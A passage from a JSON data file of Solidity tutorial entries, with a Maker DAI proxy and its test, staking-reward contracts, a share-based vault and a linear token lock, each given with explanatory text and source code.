        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\naddress constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\naddress constant PROXY_REGISTRY = 0x4678f0a6958e4D2Bc4F1BAF7Bc52E8F3564f3fE4;\naddress constant PROXY_ACTIONS = 0x82ecD135Dce65Fbc6DbdD0e4237E0AF93FFD5038;\naddress constant CDP_MANAGER = 0x5ef30b9986345249bc32d8928B7ee64DE9435E39;\naddress constant JUG = 0x19c0976f590D67707E62397C87829d896Dc0f1F1;\naddress constant JOIN_ETH_C = 0xF04a5cC80B1E94C69B48f5ee68a08CD2F09A7c3E;\naddress constant JOIN_DAI = 0x9759A6Ac90977b93B58547b4A71c78317f391A28;\n\nbytes32 constant ETH_C =\n    0x4554482d43000000000000000000000000000000000000000000000000000000;\n\ncontract DaiProxy {\n    IERC20 private constant dai = IERC20(DAI);\n    address public immutable proxy;\n    uint256 public immutable cdpId;\n\n    constructor() {\n        proxy = IDssProxyRegistry(PROXY_REGISTRY).build();\n        bytes32 res = IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(IDssProxyActions.open, (CDP_MANAGER, ETH_C, proxy))\n        );\n        cdpId = uint256(res);\n    }\n\n    receive() external payable {}\n\n    function lockEth() external payable {\n        IDssProxy(proxy).execute{value: msg.value}(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.lockETH, (CDP_MANAGER, JOIN_ETH_C, cdpId)\n            )\n        );\n    }\n\n    function borrow(uint256 daiAmount) external {\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.draw,\n                (CDP_MANAGER, JUG, JOIN_DAI, cdpId, daiAmount)\n            )\n        );\n    }\n\n    function repay(uint256 daiAmount) external {\n        dai.approve(proxy, daiAmount);\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.wipe, (CDP_MANAGER, JOIN_DAI, cdpId, daiAmount)\n            )\n        );\n    }\n\n    function repayAll() external {\n        dai.approve(proxy, type(uint256).max);\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.wipeAll, (CDP_MANAGER, JOIN_DAI, cdpId)\n            )\n        );\n    }\n\n    function unlockEth(uint256 ethAmount) external {\n        IDssProxy(proxy).execute(\n            PROXY_ACTIONS,\n            abi.encodeCall(\n                IDssProxyActions.freeETH,\n                (CDP_MANAGER, JOIN_ETH_C, cdpId, ethAmount)\n            )\n        );\n    }\n}\n\ninterface IDssProxyRegistry {\n    function build() external returns (address proxy);\n}\n\ninterface IDssProxy {\n    function execute(address target, bytes memory data)\n        external\n        payable\n        returns (bytes32 res);\n}\n\ninterface IDssProxyActions {\n    function open(address cdpManager, bytes32 ilk, address usr)\n        external\n        returns (uint256 cdpId);\n    function lockETH(address cdpManager, address ethJoin, uint256 cdpId)\n        external\n        payable;\n    function draw(\n        address cdpManager,\n        address jug,\n        address daiJoin,\n        uint256 cdpId,\n        uint256 daiAmount\n    ) external;\n    function wipe(\n        address cdpManager,\n        address daiJoin,\n        uint256 cdpId,\n        uint256 daiAmount\n    ) external;\n    function wipeAll(address cdpManager, address daiJoin, uint256 cdpId)\n        external;\n    function freeETH(\n        address cdpManager,\n        address ethJoin,\n        uint256 cdpId,\n        uint256 collateralAmount\n    ) external;\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address dst, uint256 amount) external returns (bool);\n    function transferFrom(address src, address dst, uint256 amount)\n        external\n        returns (bool);\n}\n"
      },
      {
        "fileName": "DaiProxyTest.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {Test, console2} from \"forge-std/Test.sol\";\nimport \"../../../src/defi/dai-proxy/DaiProxy.sol\";\n\naddress constant VAT = 0x35D1b3F3D7966A1DFe207aa4514C12a259A0492B;\n\nuint256 constant WAD = 1e18;\nuint256 constant RAY = 1e27;\nuint256 constant RAD = 1e45;\n\nuint256 constant ETH_AMOUNT = 100 * 1e18;\nuint256 constant DAI_AMOUNT = 10000 * 1e18;\n\ncontract DaiProxyTest is Test {\n    IERC20 private constant dai = IERC20(DAI);\n    ICdpManager private constant cdpManager = ICdpManager(CDP_MANAGER);\n    IVat private constant vat = IVat(VAT);\n    DaiProxy private proxy;\n\n    function setUp() public {\n        proxy = new DaiProxy();\n\n        // Check min borrow\n        IVat.Ilk memory ilk = vat.ilks(ETH_C);\n        assertGe(DAI_AMOUNT * RAY, ilk.dust, \"DAI borrow amount < dust\");\n\n        // Interest rate accumulator\n        console2.log(\"ilk.rate\", ilk.rate);\n    }\n\n    function print(address urnAddr) private {\n        IVat.Urn memory urn = vat.urns(ETH_C, urnAddr);\n        console2.log(\"--------------------\");\n        console2.log(\"vault collateral [wad]\", urn.ink);\n        console2.log(\"vault debt       [wad]\", urn.art);\n        console2.log(\"DAI in proxy     [wad]\", dai.balanceOf(address(proxy)));\n        console2.log(\"ETH in proxy     [wad]\", address(proxy).balance);\n    }\n\n    function test_proxy() public {\n        uint256 cdpId = proxy.cdpId();\n        address urnAddr = cdpManager.urns(cdpId);\n\n        console2.log(\"Before lock ETH\");\n        print(urnAddr);\n\n        proxy.lockEth{value: ETH_AMOUNT}();\n        console2.log(\"\");\n        console2.log(\"After lock ETH\");\n        print(urnAddr);\n\n        proxy.borrow(DAI_AMOUNT);\n        console2.log(\"\");\n        console2.log(\"After borrow DAI\");\n        print(urnAddr);\n\n        proxy.repay(DAI_AMOUNT / 2);\n        console2.log(\"\");\n        console2.log(\"After partial repay DAI\");\n        print(urnAddr);\n\n        proxy.repayAll();\n        console2.log(\"\");\n        console2.log(\"After repay all DAI\");\n        print(urnAddr);\n\n        proxy.unlockEth(ETH_AMOUNT);\n        console2.log(\"\");\n        console2.log(\"After unlock ETH\");\n        print(urnAddr);\n    }\n}\n\ninterface IVat {\n    // Collateral type\n    struct Ilk {\n        uint256 Art; // Total normalized debt      [wad]\n        uint256 rate; // Accumulated rates         [ray]\n        uint256 spot; // Price with safety margin  [ray]\n        uint256 line; // Debt ceiling              [rad]\n        uint256 dust; // Urn debt floor            [rad]\n    }\n\n    // Vault\n    struct Urn {\n        uint256 ink; // Locked collateral  [wad]\n        uint256 art; // Normalised debt    [wad]\n    }\n\n    function ilks(bytes32 ilk) external view returns (Ilk memory);\n    function urns(bytes32 ilk, address user)\n        external\n        view\n        returns (Urn memory);\n}\n\ninterface ICdpManager {\n    function urns(uint256 cdpId) external view returns (address urn);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "dai",
      "proxy"
    ],
    "order": 13
  },
  {
    "slug": "staking-rewards",
    "title": "Staking Rewards",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Staking rewards contract based on Synthetix StakingRewards.sol",
    "content": "This is a minimal example of a contract that rewards users for staking their token.\n\nCode is a stripped down version of Synthetix <a href=\"https://github.com/Synthetixio/synthetix/blob/develop/contracts/StakingRewards.sol\" target=\"__blank\">StakingRewards.sol</a>\n\n### Staking Rewards\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract StakingRewards {\n    IERC20 public immutable stakingToken;\n    IERC20 public immutable rewardsToken;\n\n    address public owner;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRate;\n    // Sum of (reward rate * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n\n    // Total staked\n    uint256 public totalSupply;\n    // User address => staked amount\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _stakingToken, address _rewardToken) {\n        owner = msg.sender;\n        stakingToken = IERC20(_stakingToken);\n        rewardsToken = IERC20(_rewardToken);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not authorized\");\n        _;\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n        }\n\n        _;\n    }\n\n    function lastTimeRewardApplicable() public view returns (uint256) {\n        return _min(finishAt, block.timestamp);\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalSupply == 0) {\n            return rewardPerTokenStored;\n        }\n\n        return rewardPerTokenStored\n            + (rewardRate * (lastTimeRewardApplicable() - updatedAt) * 1e18)\n                / totalSupply;\n    }\n\n    function stake(uint256 _amount) external updateReward(msg.sender) {\n        require(_amount > 0, \"amount = 0\");\n        stakingToken.transferFrom(msg.sender, address(this), _amount);\n        balanceOf[msg.sender] += _amount;\n        totalSupply += _amount;\n    }\n\n    function withdraw(uint256 _amount) external updateReward(msg.sender) {\n        require(_amount > 0, \"amount = 0\");\n        balanceOf[msg.sender] -= _amount;\n        totalSupply -= _amount;\n        stakingToken.transfer(msg.sender, _amount);\n    }\n\n    function earned(address _account) public view returns (uint256) {\n        return (\n            (\n                balanceOf[_account]\n                    * (rewardPerToken() - userRewardPerTokenPaid[_account])\n            ) / 1e18\n        ) + rewards[_account];\n    }\n\n    function getReward() external updateReward(msg.sender) {\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            rewardsToken.transfer(msg.sender, reward);\n        }\n    }\n\n    function setRewardsDuration(uint256 _duration) external onlyOwner {\n        require(finishAt < block.timestamp, \"reward duration not finished\");\n        duration = _duration;\n    }\n\n    function notifyRewardAmount(uint256 _amount)\n        external\n        onlyOwner\n        updateReward(address(0))\n    {\n        if (block.timestamp >= finishAt) {\n            rewardRate = _amount / duration;\n        } else {\n            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRate;\n            rewardRate = (_amount + remainingRewards) / duration;\n        }\n\n        require(rewardRate > 0, \"reward rate = 0\");\n        require(\n            rewardRate * duration <= rewardsToken.balanceOf(address(this)),\n            \"reward amount > balance\"\n        );\n\n        finishAt = block.timestamp + duration;\n        updatedAt = block.timestamp;\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "StakingRewards.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract StakingRewards {\n    IERC20 public immutable stakingToken;\n    IERC20 public immutable rewardsToken;\n\n    address public owner;\n\n    // Duration of rewards to be paid out (in seconds)\n    uint256 public duration;\n    // Timestamp of when the rewards finish\n    uint256 public finishAt;\n    // Minimum of last updated time and reward finish time\n    uint256 public updatedAt;\n    // Reward to be paid out per second\n    uint256 public rewardRate;\n    // Sum of (reward rate * dt * 1e18 / total supply)\n    uint256 public rewardPerTokenStored;\n    // User address => rewardPerTokenStored\n    mapping(address => uint256) public userRewardPerTokenPaid;\n    // User address => rewards to be claimed\n    mapping(address => uint256) public rewards;\n\n    // Total staked\n    uint256 public totalSupply;\n    // User address => staked amount\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _stakingToken, address _rewardToken) {\n        owner = msg.sender;\n        stakingToken = IERC20(_stakingToken);\n        rewardsToken = IERC20(_rewardToken);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"not authorized\");\n        _;\n    }\n\n    modifier updateReward(address _account) {\n        rewardPerTokenStored = rewardPerToken();\n        updatedAt = lastTimeRewardApplicable();\n\n        if (_account != address(0)) {\n            rewards[_account] = earned(_account);\n            userRewardPerTokenPaid[_account] = rewardPerTokenStored;\n        }\n\n        _;\n    }\n\n    function lastTimeRewardApplicable() public view returns (uint256) {\n        return _min(finishAt, block.timestamp);\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalSupply == 0) {\n            return rewardPerTokenStored;\n        }\n\n        return rewardPerTokenStored\n            + (rewardRate * (lastTimeRewardApplicable() - updatedAt) * 1e18)\n                / totalSupply;\n    }\n\n    function stake(uint256 _amount) external updateReward(msg.sender) {\n        require(_amount > 0, \"amount = 0\");\n        stakingToken.transferFrom(msg.sender, address(this), _amount);\n        balanceOf[msg.sender] += _amount;\n        totalSupply += _amount;\n    }\n\n    function withdraw(uint256 _amount) external updateReward(msg.sender) {\n        require(_amount > 0, \"amount = 0\");\n        balanceOf[msg.sender] -= _amount;\n        totalSupply -= _amount;\n        stakingToken.transfer(msg.sender, _amount);\n    }\n\n    function earned(address _account) public view returns (uint256) {\n        return (\n            (\n                balanceOf[_account]\n                    * (rewardPerToken() - userRewardPerTokenPaid[_account])\n            ) / 1e18\n        ) + rewards[_account];\n    }\n\n    function getReward() external updateReward(msg.sender) {\n        uint256 reward = rewards[msg.sender];\n        if (reward > 0) {\n            rewards[msg.sender] = 0;\n            rewardsToken.transfer(msg.sender, reward);\n        }\n    }\n\n    function setRewardsDuration(uint256 _duration) external onlyOwner {\n        require(finishAt < block.timestamp, \"reward duration not finished\");\n        duration = _duration;\n    }\n\n    function notifyRewardAmount(uint256 _amount)\n        external\n        onlyOwner\n        updateReward(address(0))\n    {\n        if (block.timestamp >= finishAt) {\n            rewardRate = _amount / duration;\n        } else {\n            uint256 remainingRewards = (finishAt - block.timestamp) * rewardRate;\n            rewardRate = (_amount + remainingRewards) / duration;\n        }\n\n        require(rewardRate > 0, \"reward rate = 0\");\n        require(\n            rewardRate * duration <= rewardsToken.balanceOf(address(this)),\n            \"reward amount > balance\"\n        );\n\n        finishAt = block.timestamp + duration;\n        updatedAt = block.timestamp;\n    }\n\n    function _min(uint256 x, uint256 y) private pure returns (uint256) {\n        return x <= y ? x : y;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "staking",
      "reward",
      "rewards"
    ],
    "order": 14
  },
  {
    "slug": "discrete-staking-rewards",
    "title": "Discrete Staking Rewards",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Discrete staking rewards",
    "content": "Similar to staking rewards contract. Difference is that reward amount may vary at each second.\n\n### Discrete Staking Rewards\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract DiscreteStakingRewards {\n    IERC20 public immutable stakingToken;\n    IERC20 public immutable rewardToken;\n\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalSupply;\n\n    uint256 private constant MULTIPLIER = 1e18;\n    uint256 private rewardIndex;\n    mapping(address => uint256) private rewardIndexOf;\n    mapping(address => uint256) private earned;\n\n    constructor(address _stakingToken, address _rewardToken) {\n        stakingToken = IERC20(_stakingToken);\n        rewardToken = IERC20(_rewardToken);\n    }\n\n    function updateRewardIndex(uint256 reward) external {\n        rewardToken.transferFrom(msg.sender, address(this), reward);\n        rewardIndex += (reward * MULTIPLIER) / totalSupply;\n    }\n\n    function _calculateRewards(address account)\n        private\n        view\n        returns (uint256)\n    {\n        uint256 shares = balanceOf[account];\n        return (shares * (rewardIndex - rewardIndexOf[account])) / MULTIPLIER;\n    }\n\n    function calculateRewardsEarned(address account)\n        external\n        view\n        returns (uint256)\n    {\n        return earned[account] + _calculateRewards(account);\n    }\n\n    function _updateRewards(address account) private {\n        earned[account] += _calculateRewards(account);\n        rewardIndexOf[account] = rewardIndex;\n    }\n\n    function stake(uint256 amount) external {\n        _updateRewards(msg.sender);\n\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n\n        stakingToken.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function unstake(uint256 amount) external {\n        _updateRewards(msg.sender);\n\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n\n        stakingToken.transfer(msg.sender, amount);\n    }\n\n    function claim() external returns (uint256) {\n        _updateRewards(msg.sender);\n\n        uint256 reward = earned[msg.sender];\n        if (reward > 0) {\n            earned[msg.sender] = 0;\n            rewardToken.transfer(msg.sender, reward);\n        }\n\n        return reward;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "DiscreteStakingRewards.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract DiscreteStakingRewards {\n    IERC20 public immutable stakingToken;\n    IERC20 public immutable rewardToken;\n\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalSupply;\n\n    uint256 private constant MULTIPLIER = 1e18;\n    uint256 private rewardIndex;\n    mapping(address => uint256) private rewardIndexOf;\n    mapping(address => uint256) private earned;\n\n    constructor(address _stakingToken, address _rewardToken) {\n        stakingToken = IERC20(_stakingToken);\n        rewardToken = IERC20(_rewardToken);\n    }\n\n    function updateRewardIndex(uint256 reward) external {\n        rewardToken.transferFrom(msg.sender, address(this), reward);\n        rewardIndex += (reward * MULTIPLIER) / totalSupply;\n    }\n\n    function _calculateRewards(address account)\n        private\n        view\n        returns (uint256)\n    {\n        uint256 shares = balanceOf[account];\n        return (shares * (rewardIndex - rewardIndexOf[account])) / MULTIPLIER;\n    }\n\n    function calculateRewardsEarned(address account)\n        external\n        view\n        returns (uint256)\n    {\n        return earned[account] + _calculateRewards(account);\n    }\n\n    function _updateRewards(address account) private {\n        earned[account] += _calculateRewards(account);\n        rewardIndexOf[account] = rewardIndex;\n    }\n\n    function stake(uint256 amount) external {\n        _updateRewards(msg.sender);\n\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n\n        stakingToken.transferFrom(msg.sender, address(this), amount);\n    }\n\n    function unstake(uint256 amount) external {\n        _updateRewards(msg.sender);\n\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n\n        stakingToken.transfer(msg.sender, amount);\n    }\n\n    function claim() external returns (uint256) {\n        _updateRewards(msg.sender);\n\n        uint256 reward = earned[msg.sender];\n        if (reward > 0) {\n            earned[msg.sender] = 0;\n            rewardToken.transfer(msg.sender, reward);\n        }\n\n        return reward;\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "discrete",
      "staking",
      "reward",
      "rewards"
    ],
    "order": 15
  },
  {
    "slug": "vault",
    "title": "Vault",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Vault",
    "content": "Simple example of vault contract, commonly used in DeFi protocols.\n\nMost vaults on the mainnet are more complex. Here we will focus on the math for calculating shares to mint on deposit and the amount of token to withdraw.\n\n### How the contract works\n\n1. Some amount of shares are minted when a user deposits.\n2. The DeFi protocol would use the users' deposits to generate yield (somehow).\n3. User burns shares to withdraw his tokens + yield.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Vault {\n    IERC20 public immutable token;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token) {\n        token = IERC20(_token);\n    }\n\n    function _mint(address _to, uint256 _shares) private {\n        totalSupply += _shares;\n        balanceOf[_to] += _shares;\n    }\n\n    function _burn(address _from, uint256 _shares) private {\n        totalSupply -= _shares;\n        balanceOf[_from] -= _shares;\n    }\n\n    function deposit(uint256 _amount) external {\n        /*\n        a = amount\n        B = balance of token before deposit\n        T = total supply\n        s = shares to mint\n\n        (T + s) / T = (a + B) / B \n\n        s = aT / B\n        */\n        uint256 shares;\n        if (totalSupply == 0) {\n            shares = _amount;\n        } else {\n            shares = (_amount * totalSupply) / token.balanceOf(address(this));\n        }\n\n        _mint(msg.sender, shares);\n        token.transferFrom(msg.sender, address(this), _amount);\n    }\n\n    function withdraw(uint256 _shares) external {\n        /*\n        a = amount\n        B = balance of token before withdraw\n        T = total supply\n        s = shares to burn\n\n        (T - s) / T = (B - a) / B \n\n        a = sB / T\n        */\n        uint256 amount =\n            (_shares * token.balanceOf(address(this))) / totalSupply;\n        _burn(msg.sender, _shares);\n        token.transfer(msg.sender, amount);\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n}\n\n```",
    "codes": [
      {
        "fileName": "Vault.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract Vault {\n    IERC20 public immutable token;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n\n    constructor(address _token) {\n        token = IERC20(_token);\n    }\n\n    function _mint(address _to, uint256 _shares) private {\n        totalSupply += _shares;\n        balanceOf[_to] += _shares;\n    }\n\n    function _burn(address _from, uint256 _shares) private {\n        totalSupply -= _shares;\n        balanceOf[_from] -= _shares;\n    }\n\n    function deposit(uint256 _amount) external {\n        /*\n        a = amount\n        B = balance of token before deposit\n        T = total supply\n        s = shares to mint\n\n        (T + s) / T = (a + B) / B \n\n        s = aT / B\n        */\n        uint256 shares;\n        if (totalSupply == 0) {\n            shares = _amount;\n        } else {\n            shares = (_amount * totalSupply) / token.balanceOf(address(this));\n        }\n\n        _mint(msg.sender, shares);\n        token.transferFrom(msg.sender, address(this), _amount);\n    }\n\n    function withdraw(uint256 _shares) external {\n        /*\n        a = amount\n        B = balance of token before withdraw\n        T = total supply\n        s = shares to burn\n\n        (T - s) / T = (B - a) / B \n\n        a = sB / T\n        */\n        uint256 amount =\n            (_shares * token.balanceOf(address(this))) / totalSupply;\n        _burn(msg.sender, _shares);\n        token.transfer(msg.sender, amount);\n    }\n}\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 amount\n    );\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "defi",
      "vault"
    ],
    "order": 16
  },
  {
    "slug": "token-lock",
    "title": "Token Lock",
    "category": "DeFi",
    "categorySlug": "defi",
    "description": "Token lock",
    "content": "Example of a contract that locks tokens and releases them linearly over a specific time period.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {IERC20} from \"./IERC20.sol\";\n\ncontract Auth {\n    mapping(address => bool) public authorized;\n\n    modifier auth() {\n        require(authorized[msg.sender], \"not authorized\");\n        _;\n    }\n\n    constructor() {\n        authorized[msg.sender] = true;\n    }\n\n    function allow(address user) external auth {\n        authorized[user] = true;\n    }\n\n    function deny(address user) external auth {\n        authorized[user] = false;\n    }\n}\n\ncontract TokenLock is Auth {\n    struct Lock {\n        // Locked amount\n        uint256 amount;\n        // Last lock timestamp\n        uint32 updatedAt;\n        // Lock expiry timestamp\n        uint32 expiresAt;\n        // Lock duration\n        uint32 duration;\n    }\n\n    mapping(address => Lock) public locks;\n    mapping(address => uint256) public freed;\n\n    function get(address token) external view returns (Lock memory) {\n        return locks[token];\n    }\n\n    function set(address token, uint32 duration) external auth {\n        locks[token].duration = duration;\n    }\n\n    function unlocked(address token) public view returns (uint256) {\n        Lock memory l = locks[token];\n        // block.timestamp >= expiresAt >= updatedAt\n        // block.timestamp >= updateAt >= expiresAt\n        if (block.timestamp >= l.expiresAt) {\n            return l.amount;\n        }\n        // expiresAt > block.timestamp >= updateAt\n        return l.amount * (block.timestamp - uint256(l.updatedAt))\n            / uint256(l.expiresAt - l.updatedAt);\n    }\n\n    function claimable(address token) public view returns (uint256) {\n        return freed[token] + unlocked(token);\n    }\n\n    function lock(address token, uint256 amount) external auth {\n        uint256 free = unlocked(token);\n\n        Lock storage l = locks[token];\n        l.amount -= free;\n        l.updatedAt = uint32(block.timestamp);\n        l.expiresAt = uint32(block.timestamp) + l.duration;\n        freed[token] += free;\n\n        if (amount > 0) {\n            IERC20(token).transferFrom(msg.sender, address(this), amount);\n            l.amount += amount;\n        }\n    }\n\n    function unlock(address token) external auth returns (uint256 amount) {\n        uint256 free = unlocked(token);\n\n        Lock storage l = locks[token];\n        l.amount -= free;\n        l.updatedAt = uint32(block.timestamp);\n\n        amount = freed[token] + free;\n        freed[token] = 0;\n\n        if (amount > 0) {\n            IERC20(token).transfer(msg.sender, amount);\n        }\n    }\n\n    function sync(address token) external auth {\n        uint256 reserved = freed[token] + locks[token].amount;\n        uint256 bal = IERC20(token).balanceOf(address(this));\n        if (bal > reserved) {\n            IERC20(token).transfer(msg.sender, bal - reserved);\n        }\n    }\n}\n\n```\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```",
    "codes": [
      {
        "fileName": "IERC20.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      },
      {
        "fileName": "TokenLock.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.26;\n\nimport {IERC20} from \"./IERC20.sol\";\n\ncontract Auth {\n    mapping(address => bool) public authorized;\n\n    modifier auth() {\n        require(authorized[msg.sender], \"not authorized\");\n        _;\n    }\n\n    constructor() {\n        authorized[msg.sender] = true;\n    }\n\n    function allow(address user) external auth {\n        authorized[user] = true;\n    }\n\n    function deny(address user) external auth {\n        authorized[user] = false;\n    }\n}\n\ncontract TokenLock is Auth {\n    struct Lock {\n        // Locked amount\n        uint256 amount;\n        // Last lock timestamp\n        uint32 updatedAt;\n        // Lock expiry timestamp\n        uint32 expiresAt;\n        // Lock duration\n        uint32 duration;\n    }\n\n    mapping(address => Lock) public locks;\n    mapping(address => uint256) public freed;\n\n    function get(address token) external view returns (Lock memory) {\n        return locks[token];\n    }\n\n    function set(address token, uint32 duration) external auth {\n        locks[token].duration = duration;\n    }\n\n    function unlocked(address token) public view returns (uint256) {\n        Lock memory l = locks[token];\n        // block.timestamp >= expiresAt >= updatedAt\n        // block.timestamp >= updateAt >= expiresAt\n        if (block.timestamp >= l.expiresAt) {\n            return l.amount;\n        }\n        // expiresAt > block.timestamp >= updateAt\n        return l.amount * (block.timestamp - uint256(l.updatedAt))\n            / uint256(l.expiresAt - l.updatedAt);\n    }\n\n    function claimable(address token) public view returns (uint256) {\n        return freed[token] + unlocked(token);\n    }\n\n    function lock(address token, uint256 amount) external auth {\n        uint256 free = unlocked(token);\n\n        Lock storage l = locks[token];\n        l.amount -= free;\n        l.updatedAt = uint32(block.timestamp);\n        l.expiresAt = uint32(block.timestamp) + l.duration;\n        freed[token] += free;\n\n        if (amount > 0) {\n            IERC20(token).transferFrom(msg.sender, address(this), amount);\n            l.amount += amount;\n        }\n    }\n\n    function unlock(address token) external auth returns (uint256 amount) {\n        uint256 free = unlocked(token);\n\n        Lock storage l = locks[token];\n        l.amount -= free;\n        l.updatedAt = uint32(block.timestamp);\n\n        amount = freed[token] + free;\n        freed[token] = 0;\n\n        if (amount > 0) {\n            IERC20(token).transfer(msg.sender, 